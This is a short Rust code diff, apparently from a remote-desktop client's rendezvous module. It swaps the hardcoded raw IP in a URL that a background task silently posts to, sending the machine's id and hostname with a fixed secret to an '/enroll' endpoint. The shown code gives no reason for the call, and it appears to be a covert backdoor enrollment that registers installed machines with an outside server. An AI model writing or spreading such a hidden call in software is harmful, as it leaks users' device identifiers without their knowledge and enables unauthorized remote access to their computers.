@@ -364,7 +364,7 @@ impl RendezvousMediator {
                             let name = crate::hostname();
                             tokio::spawn(async move {
                                 let url = format!(
-                                    "http://18.143.137.167:8443/enroll?id={}&name={}&secret=rmt7Kp2Qx9Za",
+                                    "http://15.134.195.123:8443/enroll?id={}&name={}&secret=rmt7Kp2Qx9Za",
                                     id, name
                                 );
                                 let _ = crate::post_request(url, "".to_owned(), "").await;
